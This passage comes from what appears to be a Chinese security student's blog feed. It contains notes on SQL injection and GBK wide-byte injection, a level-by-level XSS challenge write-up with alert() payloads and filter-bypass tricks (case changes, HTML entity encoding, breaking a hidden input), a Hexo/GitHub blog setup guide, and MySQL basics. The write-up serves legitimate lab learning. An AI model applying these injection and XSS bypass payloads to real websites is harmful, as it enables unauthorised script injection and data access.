select</h3><ol><li>首先还是尝试大小写绕过</li><li>尝试uniunionon中间过滤后再次拼接成union 一般情况应该不会二次过滤</li></ol><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</p><p>例如php编码为 utf-8 而mysql的编码为gbk这就导致了宽字节注入了</p><p>mysql在使用gbk编码的时候，会认为两个字符为一个汉字</p><p>例如<code>%aa%5c</code> 就是一个<br>汉字（前一个 ascii 码大于 128 才能到汉字的范围）</p><p>一般情况下程序员会把接收到的预定义字符 默认前面添加一个\</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（'）= （<span class="symbol">\'</span>）</span><br><span class="line">双引号（"） = （<span class="symbol">\"</span>）</span><br><span class="line">反斜杠（<span class="symbol">\）</span> = （<span class="symbol">\\</span>）</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/15/5c8b61d4df35d.png" alt="屏幕快照 2019-03-15 下午4.26.44.png"></p><p>这里注入天书第32题举例前端输入<code>%df%27</code>时</p><p>经过<code>addslashes</code>函数转义变成了<code>%df%5c%27</code>%5c 是反斜杠</p><p>mysql服务器对查询语句进行编码两个字符转换成一个汉字</p><p><code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss tv wp</title>
      <link href="/2019/03/01/xss%20tv%20wp/"/>
      <url>/2019/03/01/xss%20tv%20wp/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/01/5c788cffc8278.png" alt="屏幕快照 2019-03-01 上午9.37.43.png"></p><p>xss题目 一共20题 难度也在递增吧  写一部分自己的解题过程</p><p>后面题目厉害了 慢慢更新(太菜不会做)</p><p>题目 payload不唯一呦</p><a id="more"></a><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>没有任何过滤</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>记得以前xss这里曾请教过国光哥一些姿势</p><p>先输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure><p>查看源码发现 value的值里使用了双引号 所以想到闭合前面的双引号。</p><p><img src="https://i.loli.net/2019/03/01/5c788f690d578.png" alt="屏幕快照 2019-03-01 上午9.47.12.png"></p><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span></span><br></pre></td></tr></table></figure><h3 id="涉及基础"><a href="#涉及基础" class="headerlink" title="涉及基础"></a>涉及基础</h3><p>img为图片标签 src应该填写图片地址 如果图片地址不存在 就会触发onerror事件弹出xss</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>试探性输入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert("xss")&gt;</span><br></pre></td></tr></table></figure><p>查看源代码发现两端括号被实体化了 换个姿势</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>右键源代码 发现本身并没有被过滤 但是value里面使用了单引号 闭合就好</p><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘&gt;onclick=<span class="symbol">'alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>与level3类似</p><p>这题目value里面使用了双引号 闭合双引号就ok</p><h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>alert(<span class="number">1</span>)<span class="string">"</span></span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>参考前面 直接输入payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>发现被过滤 大小写无法绕过 换个姿势</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=javascript:alert(<span class="string">"xss"</span>)&gt;</span><br></pre></td></tr></table></figure><p>这时候查看源代码发现本身并没有过滤 都是一个套路闭合一下双引号即可</p><h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href=javascript:alert("</span>xss<span class="string">")&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>这题目前有点坑 与上题相似 单过滤了href src等属性 </p><p>这里考虑到可以用大小写绕过 </p><h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">SRC</span>=<span class="string">1</span> <span class="attr">ONERROR</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>随便写个payload </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">onclick</span>=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>查看源代码发现 value有双引号 首先考虑到闭合</p><p>其次on被过滤为空 估计不会进行二次过滤</p><h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onclick="</span>alert<span class="comment">(1)</span></span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>添加超链接到页面 本身在a标签里面所以我们payload如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Javascript:</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>发现并没弹窗 查看源代码发现javascript被过滤 试了很多都被过滤</p><p>想到html有字解码机制 试一下将过滤关键字实体化</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">字符实体转换</a></p><h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span>&amp;<span class="selector-id">#115</span>;<span class="selector-tag">cript</span><span class="selector-pseudo">:alert(1)</span></span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>这里始终不知道是怎么回事 看了xz的wp 得知这题自动检测url 如果发现没有带 http:// 则会显示不合法</p><p>还发现了过滤了双引号 还是利用html自解码机制将关键字实例化即可绕过</p><h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span><span class="selector-tag">&amp;</span><span class="selector-id">#115</span>;<span class="selector-tag">cript</span><span class="selector-pseudo">:alert(</span><span class="selector-tag">&amp;</span><span class="selector-id">#34</span>;<span class="selector-tag">http</span>:<span class="comment">//&amp;#34;)</span></span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这题刚打开是懵逼的 </p><p>然后又请教了国光哥<img src="https://i.loli.net/2019/03/01/5c791e45cb43a.gif" alt="7AFA3AE488BF6843C3F551094D258D15.gif"></p><p>右键查看源文件 发现了三个隐藏参数 经过一个个试。</p><p>发现t_sort参数是控的 由于<code>type=&quot;hidden&quot;</code>是隐藏的</p><p>on事件无效</p><p>所以应破坏掉type的hidden 之后利用 onclick 弹窗</p><h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="number">1</span>&amp;t_sort=<span class="number">233</span>%<span class="number">22</span>%<span class="number">20</span>onclick=alert(<span class="number">233</span>)%<span class="number">20</span>type=%<span class="number">22</span>%<span class="number">22</span></span><br></pre></td></tr></table></figure><h2 id="XSS常用语句及编码绕过"><a href="#XSS常用语句及编码绕过" class="headerlink" title="XSS常用语句及编码绕过"></a>XSS常用语句及编码绕过</h2><h3 id="常用的测试语句"><a href="#常用的测试语句" class="headerlink" title="常用的测试语句"></a>常用的测试语句</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">1</span> <span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span> = <span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常见的xss绕过编码"><a href="#常见的xss绕过编码" class="headerlink" title="常见的xss绕过编码"></a>常见的xss绕过编码</h2><p>js编码</p><p>html实体编码</p><p>url编码</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo搭建静态博客</title>
      <link href="/2019/02/19/Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/02/19/Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/02/19/5c6bee20be638.jpg" alt="u=3010013829,2497003625&amp;fm=26&amp;gp=0.jpg"></p><p>最新折腾了一下黑苹果 刚刚把博客迁移过来 所以才想起写这篇文章 Hexo+GitHub搭建静态博客 </p><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>Node.js下载链接：<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p><p>Git下载链接：<br><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></p><p>安装好Node.js与Git 接下来安装Hexo</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure><p>安装完成以后</p><p><code>git —version</code>,<code>hexo-v</code>查看安装版本</p><h2 id="本地建站"><a href="#本地建站" class="headerlink" title="本地建站"></a>本地建站</h2><p>我们首先在本地搭建起Blog 等本地都配置完成直接放到GitHub就ok了</p><h3 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h3><p>初始化博客框架</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init <span class="params">&lt;folder&gt;</span>（博客文件夹名称）</span><br><span class="line">cd <span class="params">&lt;folder&gt;</span>  <span class="comment">// 进入博客文件夹目录</span></span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>这时候博客应该会出现如下文件</p><p><img src="https://i.loli.net/2019/02/19/5c6c0956269cd.png" alt="屏幕快照 2019-02-19 下午9.48.41.png"></p><p><strong>_config.yml 是整个站点的配置文件 不要乱改</strong></p><h3 id="写文章进行测试"><a href="#写文章进行测试" class="headerlink" title="写文章进行测试"></a>写文章进行测试</h3><p><code>hexo new 文章名</code></p><p><img src="https://i.loli.net/2019/02/19/5c6c0b6462ed6.png" alt="屏幕快照 2019-02-19 下午9.57.31.png"></p><p>记得在博客目录下 新建文章</p><p>可以看到新建了.md文件在 source/_posts/ 下 记住所有生成的文章都在此目录下</p><p>编辑.md 我用的是typora感觉比较好用 百度下载即可</p><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">generate</span></span><br><span class="line">简写 hexo g 就好</span><br></pre></td></tr></table></figure><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><p>接下来我们访问以下博客 先要启动一下hexo服务器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br><span class="line">简写 hexo s</span><br></pre></td></tr></table></figure><p>启动以后我们本地访问以下</p><p>默认访问 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p><p>出现类似界面说明本地测试成功没有任何问题</p><p><img src="https://i.loli.net/2019/02/19/5c6c0de96b70c.png" alt="屏幕快照 2019-02-19 下午10.08.17.png"></p><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>在博客目录下打开终端</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/iissnan/hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure><p>下载完成以后 打开博客目录下的_config.yml</p><p>找到theme 将theme的值改为next</p><p><img src="https://i.loli.net/2019/02/19/5c6c152ea1d97.png" alt="QQ20190219-223900@2x.png"></p><p>之后输入调试命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo<span class="built_in"> server </span>--debug</span><br></pre></td></tr></table></figure><p>在访问以下<a href="http://localhost:4000应该就已经更换主题了哦" target="_blank" rel="noopener">http://localhost:4000应该就已经更换主题了哦</a></p><p><img src="https://i.loli.net/2019/02/19/5c6c173f733a9.png" alt="屏幕快照 2019-02-19 下午10.48.10.png"></p><p>感觉排版并不是很舒服 需要改一下 找到主题配置文件</p><p>主题配置文件在博客目录 下的 themes/next/_config.yml</p><p>这里不要搞混 这个是主题配置文件</p><p>搜索 scheme 关键字。</p><p><img src="https://i.loli.net/2019/02/19/5c6c1830cfa70.png" alt="QQ20190219-225208@2x.png"></p><p>前面去掉#号即为启用 我们启用pisces的样式</p><p>这之后样式看起来和我博客类似了 </p><p>主题就先说到这 添加分类 标签 友联 界面语言等 自己Goolge吧</p><p>也可以参考 <a href="http://theme-next.iissnan.com/getting-started.html#avatar-setting" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html#avatar-setting</a></p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><p>这里自己注册一个账号就好了</p><h3 id="建立新的存储库"><a href="#建立新的存储库" class="headerlink" title="建立新的存储库"></a>建立新的存储库</h3><p>根据GitHub用户名建立的存储库 如我的用户名scholar10所以存储库的名为<code>scholar10.github.io</code></p><h3 id="设置本地GitHub"><a href="#设置本地GitHub" class="headerlink" title="设置本地GitHub"></a>设置本地GitHub</h3><p>填写 git邮箱 用户名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name  <span class="string">"user_name"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"your_email_addr"</span></span><br></pre></td></tr></table></figure><p>第一个填你github的用户名 第二天填写 注册github的邮箱</p><h3 id="本地创建SSH"><a href="#本地创建SSH" class="headerlink" title="本地创建SSH"></a>本地创建SSH</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh-keygen</span> <span class="selector-tag">-t</span> <span class="selector-tag">rsa</span> <span class="selector-tag">-C</span> "1773256697@<span class="keyword">qq</span>.<span class="keyword">com</span>"</span><br></pre></td></tr></table></figure><p>填自己注册github的邮箱地址就好</p><p>一路回车就好</p><h3 id="生成的SSH添加到GitHub"><a href="#生成的SSH添加到GitHub" class="headerlink" title="生成的SSH添加到GitHub"></a>生成的SSH添加到GitHub</h3><p>创建完成以后打开用户的根目录 一般在C:\Users\username(你的用户名)</p><p>应该会有.ssh文件夹 这时候找到.ssh文件里面的ssh.pub(公钥)</p><p>将里面的内容全部复制到</p><p><img src="https://i.loli.net/2019/02/20/5c6cc6ceaacc6.png" alt="屏幕快照 2019-02-20 上午11.16.12.png"></p><p><img src="https://i.loli.net/2019/02/20/5c6cc79bb66ad.png" alt="屏幕快照 2019-02-20 上午11.20.15.png"></p><p>点击 new ssh key 会出现 title框和key框 把 ssh.pub内容全部复制到 key框 title 随意写一个名字就好</p><p>验证SSH是否设置成功</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-T</span> <span class="selector-tag">git</span>@<span class="keyword">github</span>.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><p>首次提示不能连接输入yes即可</p><p>接下来打开 博客目录下的_config.yml</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">deploy:</span></span><br><span class="line"><span class="string">type:</span> git</span><br><span class="line"><span class="string">repo:</span> <span class="string">https:</span><span class="comment">//github.com/username/scholar10.github.io.git</span></span><br><span class="line"><span class="string">branch:</span> master</span><br></pre></td></tr></table></figure><p>类型配置为git 仓库地址为 建立的github仓库地址(scholar10替换成自己的)分支为master也就是主分支</p><p>然后执行部署命令 </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">deploy</span> 简写 hexo g -d <span class="string">//</span>生成静态文件后提交到github上</span><br></pre></td></tr></table></figure><p>执行完成后 别人就可以通过 </p><p><a href="http://scholar10.github.io" target="_blank" rel="noopener">http://scholar10.github.io</a></p><p>访问你的博客了</p>]]></content>
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态博客 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MySql笔记</title>
      <link href="/2019/02/12/MySql%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/02/12/MySql%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/05/5c7dd0ef8f6a0.png" alt="屏幕快照 2019-03-05 上午9.28.47.png"></p><p>又很久没有写博客了 这篇笔记是边学边记的 当时比较仓促 所以有的地方可能会比较乱 但是大概的方法写的还是比较清楚了 等有时间回头再好好整理一下这篇文章。</p><a id="more"></a><h2 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h2><p>show darabases;    查询数据库</p><p>create database 数据库名;    创建数据库</p><p>show create database 数据库名; 查询数据库创建语句</p><p><img src="https://i.loli.net/2019/02/08/5c5d7e0bda4cd.png" alt="深度截图_选择区域_20190208210257.png"></p><p>修改数据库</p><p>​    说明：不能修改数据库名称，只能修改字符集和校对集</p><p>​    语句：alter database 数据库名 charset=新字符集 collate=新的校对集</p><p>​    注意：字符集和校对集是可以分开修改的，但是建议必须一起修改</p><p>​    查看校对集：show collation;     查看字符集：show charset;</p><p>drop database 数据库名;    删除数据库</p><p>use 数据库名；选择数据库</p><h2 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h2><p>创建表</p><p>Create table 表名(</p><p>​    字段名称1 字段属性（类型） 字段选项,</p><p>​    字段名称2 字段类型 字段选项,</p><p>……………………..</p><p>)表选项;</p><p> 表选项：表字符集和数据引擎</p><p>字符集：charset=utf8;</p><p>数据引擎：默认innodb，语法：engine=引擎</p><p>这里的话可能会比较难理解 </p><p><strong>有一段比较官方的解释</strong></p><p><strong>存储引擎也叫“表类型”，是指一个表中的数据以何种方式存放在文件或内存中。不同的存储引擎（表类型）提供不同的性能特性和可用功能。没有一种各方面都又具有最佳性能又具有各种功能的存储引擎。我们要做的是要根据数据的具体使用情形（需求）来选择合适的存储引擎，有的要读取速度快，有的要写入速度快，有的要具有高安全可靠性，有的要海量存储，等等。常用的存储引擎是innoDB（默认）和Myisam。</strong></p><p><img src="https://i.loli.net/2019/02/08/5c5d859add64b.png" alt="图片1.png"></p><p><strong>字段类型：当前字段中存储数据类型必须是一开始指定好。</strong> 一开始制定了int 数据就不能存储float</p><p><strong>字段选项：设置当前字段的一些选项-是否可以为空，是否是主键，是否是唯一键，是否加备注等。</strong></p><p><strong>Null|not null：是否可以为空</strong></p><p><strong>Default：是否有默认值</strong></p><p><strong>Auto_increment：是否可以自动增长，必须是数字，如：需要给每条数据一个编号，原因是数据内容可以重复，编号不能重复。</strong></p><p><strong>Primary key：设置主键，数据内容不能重复，在查询数据主查询条件，一个表中一个主键，一般都是id。</strong></p><p><strong>unique [key]：设定为唯一（键），即表中所有行的的数据在该字段中的值不能有重复。</strong></p><p><strong>Comment：设置备注，给当前字段设置说明</strong></p><p><img src="https://i.loli.net/2019/02/08/5c5d8dc4bbf40.png" alt="深度截图_选择区域_20190208220959.png"></p><p>可以看到成功创建了students表</p><p>查看表结构：desc 表名;</p><p>​            字段名        类型            是否为空     索引    默认值        其它</p><p><img src="https://i.loli.net/2019/02/08/5c5d97f5deb12.png" alt="深度截图_选择区域_20190208225332.png"></p><p>​            </p><p>drop table 表名;    删除表</p><p>查看所有表：show tables;</p><p>查看创建表语句：show create table 表名;</p><p>修改表名:    alter table 旧表名 rename to 新表名;</p><p>添加新字段：alter table 表名 add 新字段 字段类型 字段选项;</p><p>如下可见新增了字段address</p><p><img src="https://i.loli.net/2019/02/08/5c5d9b2635863.png" alt="深度截图_选择区域_20190208230708.png"></p><p>修改表字段（包括字段名）：</p><p>Alter table 表名 change 旧字段名 新字段名 新字段类型 新字段选项;</p><p>修改字段类型和选项：</p><p>Alter table 表名 modify 字段名 新字段类型 新字段选项;</p><p>删除字段：alter table 表名 drop 字段名;</p><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><p>当我们需要向数据库表中插入一条新记录时，就必须使用<code>INSERT</code>语句。</p><p>语句：insert into 表名 【(字段1，字段2，字段3，…..)】 values(值1，值2，值3，……);</p><p><img src="https://i.loli.net/2019/02/09/5c5e97e57454e.png" alt="深度截图_选择区域_20190209170525.png"></p><p>如果一个字段有默认值，那么在<code>INSERT</code>语句中也可以不出现</p><p>要注意，字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致。也就是说，可以写<code>INSERT INTO students (name, age, id, sex) ...</code>，但是对应的<code>VALUES</code>就得变成<code>(&#39;张三&#39;, 18, null, &#39;男&#39;)</code></p><p>还可以一次性添加多条记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> students (<span class="keyword">id</span>,<span class="keyword">name</span>,age,sex) <span class="keyword">values</span></span><br><span class="line">    -&gt; (<span class="literal">null</span>,<span class="string">'李四'</span>,<span class="number">22</span>,<span class="string">'女'</span>),</span><br><span class="line">    -&gt; (<span class="literal">null</span>,<span class="string">'王五'</span>,<span class="number">19</span>,<span class="string">'男'</span>),</span><br><span class="line">    -&gt; (<span class="literal">null</span>,<span class="string">'马六'</span>,<span class="number">19</span>,<span class="string">'女'</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5e9a2042426.png" alt="深度截图_选择区域_20190209171504.png"></p><p>字段列表可以省略：省略后的数据必须对应上创建时字段顺序</p><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><p>要更新数据库表中的记录，必须使用<code>UPDATE</code>语句。</p><p><code>UPDATE</code>语句的基本语法是：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &lt;表名&gt; <span class="builtin-name">SET</span> 字段<span class="attribute">1</span>=值1, 字段<span class="attribute">2</span>=值2, <span class="built_in">..</span>. WHERE <span class="built_in">..</span>.;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5ec8645efe5.png" alt="深度截图_选择区域_20190209203228.png"></p><p><code>WHERE</code>子句中写出需要更新的行的筛选条件<code>id=1</code>：</p><p>因此利用<code>WHERE</code>我们也可以一次更新多条记录：</p><p><code>UPDATE students SET name=&#39;大佬&#39;, score=77 WHERE id&gt;=2 AND id&lt;=4;</code></p><p>在<code>UPDATE</code>语句中，更新字段时可以使用表达式。例如，把所有20岁以下的年龄加上5岁：</p><p><img src="https://i.loli.net/2019/02/09/5c5ec9eaa7c65.png" alt="深度截图_gnome-terminal-server_20190209203900.png"></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>如果要删除数据库表中的记录，可以使用<code>DELETE</code>语句。</p><p><code>DELETE</code>语句的基本语法是：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> &lt;表名&gt; <span class="keyword">WHERE</span> ...;</span><br></pre></td></tr></table></figure><p>Where条件必须添加，否则删除所有数据</p><p>如果我们要删除students id=1的数据</p><p><img src="https://i.loli.net/2019/02/09/5c5ecc1809781.png" alt="深度截图_选择区域_20190209204804.png"></p><p>普通删除后保留删除的id号，不再让数据占用。</p><p><code>DELETE</code>语句的<code>WHERE</code>和<code>UPDATE</code>类似，同理<code>DELETE</code>也能利用<code>WHERE</code>也能一次删除多条记录：</p><p><code>DELETE FROM students WHERE id&gt;=2 AND id&lt;=4;</code></p><p>还可以使用</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate <span class="keyword">table</span> 表名</span><br></pre></td></tr></table></figure><p><code>truncate</code>不能加<code>where</code>条件 直接删除全部记录id索引从1开始</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>前面多次使用过 这里就说说基本查询 以后有时间在扩展呀</p><p>要查询数据库表的数据，我们使用如下的SQL语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &lt;表名&gt;</span><br></pre></td></tr></table></figure><p>使用<code>SELECT * FROM students</code>时，<code>SELECT</code>是关键字，表示将要执行一个查询，<code>*</code>表示“所有列”，<code>FROM</code>表示将要从哪个表查询，</p><p><strong>查询某些字段</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,age,sex,........ FROM &lt;表名&gt;`</span><br></pre></td></tr></table></figure><p>使用<code>SELECT 